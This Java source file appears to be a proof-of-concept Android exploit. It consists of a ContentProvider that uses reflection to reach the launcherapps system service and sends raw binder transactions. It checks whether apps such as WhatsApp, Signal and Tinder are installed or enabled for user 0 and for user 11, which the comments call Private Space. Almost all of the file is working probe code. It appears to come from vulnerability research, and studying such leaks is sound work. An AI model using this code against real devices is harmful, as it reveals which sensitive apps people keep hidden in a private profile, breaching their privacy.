package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class LauncherDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("launcherapps");
        if (binder == null) { cursor.addRow(new Object[]{"error", "no binder"}); return cursor; }
        String desc = "android.content.pm.ILauncherApps";

        // TX=29 returned 1860 bytes! Analyze what it is.
        // My test sent: writeInterfaceToken + writeString(pkg)
        // Let's get the full raw data
        cursor.addRow(new Object[]{"=== TX=29 Analysis ===", ""});
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                binder.transact(29, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"tx29_avail", String.valueOf(avail)});

                // Try reading as ParceledListSlice (list of Parcelables)
                // Format: int count, then Parcelable items
                // OR: int marker(1) + Parcelable (if single object)
                int marker = reply.readInt();
                if (marker == 1) {
                    // Could be a single Intent/ComponentName parcelable
                    // Or ParceledListSlice (marker=1 means inline list vs binder)
                    // ParceledListSlice: 1(inline) + count + items
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"tx29_type", "marker=1 count=" + count});

                    // Try reading as string list (getPreInstalledSystemPackages returns List<String>)
                    if (count > 0 && count < 500) {
                        StringBuilder sb = new StringBuilder("[");
                        for (int i = 0; i < Math.min(count, 20); i++) {
                            String s = reply.readString();
                            sb.append(s != null ? s : "null");
                            if (i < Math.min(count, 20) - 1) sb.append(",");
                        }
                        if (count > 20) sb.append("...(+" + (count - 20) + " more)");
                        sb.append("]");
                        cursor.addRow(new Object[]{"tx29_data", sb.toString()});
                    }
                } else {
                    cursor.addRow(new Object[]{"tx29_type", "marker=" + marker});
                    // Try reading strings
                    int count = reply.readInt();
                    if (count > 0 && count < 500) {
                        StringBuilder sb = new StringBuilder("count=" + count + " [");
                        for (int i = 0; i < Math.min(count, 10); i++) {
                            String s = reply.readString();
                            sb.append(s != null ? s : "null");
                            if (i < Math.min(count, 10) - 1) sb.append(",");
                        }
                        sb.append("]");
                        cursor.addRow(new Object[]{"tx29_data2", sb.toString()});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"tx29_err", "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=29 with no args (just interface token)
        cursor.addRow(new Object[]{"=== TX=29 no args ===", ""});
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                binder.transact(29, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"tx29_noargs", "avail=" + avail});
                if (avail > 0) {
                    int marker = reply.readInt();
                    cursor.addRow(new Object[]{"tx29_noargs_m", "marker=" + marker});
                    if (marker != 0) {
                        int next = reply.readInt();
                        cursor.addRow(new Object[]{"tx29_noargs_n", "next=" + next});
                        if (next > 0 && next < 500) {
                            StringBuilder sb = new StringBuilder("[");
                            for (int i = 0; i < Math.min(next, 20); i++) {
                                String s = reply.readString();
                                sb.append(s != null ? s : "null");
                                if (i < Math.min(next, 20) - 1) sb.append(",");
                            }
                            sb.append("]");
                            cursor.addRow(new Object[]{"tx29_noargs_data", sb.toString()});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"tx29_noargs_err", truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=11 and TX=23 returned avail=4 with 0x0 — these are boolean false results
        // TX=39 returned [0x1, 0x1, 0x0] — could be getUserProfiles

        // TX=39 deeper analysis
        cursor.addRow(new Object[]{"=== TX=39 Analysis ===", ""});
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                binder.transact(39, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"tx39_avail", String.valueOf(avail)});
                // Could be getUserProfiles: returns List<UserHandle>
                // writeTypedList: count + (marker + userId)*count
                int count = reply.readInt();
                cursor.addRow(new Object[]{"tx39_count", String.valueOf(count)});
                if (count > 0 && count < 20) {
                    StringBuilder sb = new StringBuilder("[");
                    for (int i = 0; i < count; i++) {
                        int m = reply.readInt(); // marker
                        if (m != 0) {
                            int userId = reply.readInt();
                            sb.append("user=").append(userId);
                        } else {
                            sb.append("null");
                        }
                        if (i < count - 1) sb.append(",");
                    }
                    sb.append("]");
                    cursor.addRow(new Object[]{"tx39_users", sb.toString()});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"tx39_err", truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=7 needed START_TASKS_FROM_RECENTS — this is getActivityLaunchIntent
        // TX=6 needed package name — could be isPackageEnabled

        // Test TX=6 with actual package names (isPackageEnabled)
        cursor.addRow(new Object[]{"=== TX=6 isPackageEnabled ===", ""});
        String[] testPkgs = {"com.android.chrome", "com.whatsapp", "org.thoughtcrime.securesms",
            "com.tinder", "com.google.android.gms"};
        for (String pkg : testPkgs) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName()); // callingPackage
                data.writeString(pkg); // target package
                // UserHandle parcelable: marker + int userId
                data.writeInt(1); // non-null marker
                data.writeInt(0); // userId
                binder.transact(6, data, reply, 0);
                reply.readException();
                int result = reply.readInt();
                cursor.addRow(new Object[]{"pkg_u0_" + shortPkg(pkg), "enabled=" + result});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"pkg_u0_" + shortPkg(pkg), "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"pkg_u0_" + shortPkg(pkg), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Same for user 11
        cursor.addRow(new Object[]{"=== TX=6 isPackageEnabled user 11 ===", ""});
        for (String pkg : testPkgs) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(pkg);
                data.writeInt(1); // non-null
                data.writeInt(11); // userId = Private Space
                binder.transact(6, data, reply, 0);
                reply.readException();
                int result = reply.readInt();
                cursor.addRow(new Object[]{"pkg_u11_" + shortPkg(pkg),
                    "enabled=" + result + (result != 0 ? " FOUND IN PRIVATE SPACE!" : "")});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"pkg_u11_" + shortPkg(pkg), "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"pkg_u11_" + shortPkg(pkg), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=12 isActivityEnabled with specific activities
        cursor.addRow(new Object[]{"=== TX=12 isActivityEnabled ===", ""});
        // ComponentName: marker + pkg + class
        String[][] activities = {
            {"com.android.chrome", "com.google.android.apps.chrome.Main"},
            {"com.whatsapp", "com.whatsapp.Main"},
            {"com.tinder", "com.tinder.activities.LoginActivity"},
        };
        for (String[] act : activities) {
            for (int userId : new int[]{0, 11}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeString(getContext().getPackageName());
                    // ComponentName
                    data.writeInt(1); // non-null marker
                    data.writeString(act[0]);
                    data.writeString(act[1]);
                    // UserHandle
                    data.writeInt(1); // non-null
                    data.writeInt(userId);
                    binder.transact(12, data, reply, 0);
                    reply.readException();
                    int result = reply.readInt();
                    cursor.addRow(new Object[]{"act_u" + userId + "_" + shortPkg(act[0]),
                        "enabled=" + result});
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"act_u" + userId + "_" + shortPkg(act[0]),
                        "DENIED:" + truncate(e.getMessage())});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"act_u" + userId + "_" + shortPkg(act[0]),
                        "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        return cursor;
    }

    private String shortPkg(String pkg) {
        String[] parts = pkg.split("\\.");
        return parts[parts.length - 1];
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
